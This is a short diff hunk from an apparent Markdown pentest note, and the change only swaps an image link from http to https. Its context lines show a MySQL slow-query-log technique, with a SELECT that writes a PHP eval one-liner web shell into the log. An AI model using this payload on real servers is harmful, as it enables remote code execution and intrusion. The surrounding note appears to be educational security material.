@@ -343,7 +343,7 @@ set GLOBAL slow_query_log=on;
 select '<?php eval($_POST["soap"]);?>' from mysql.db where sleep(10);
 ```
 
-![image-20210321161304678](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210321161304678.png)
+![image-20210321161304678](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210321161304678.png)
 
 
 
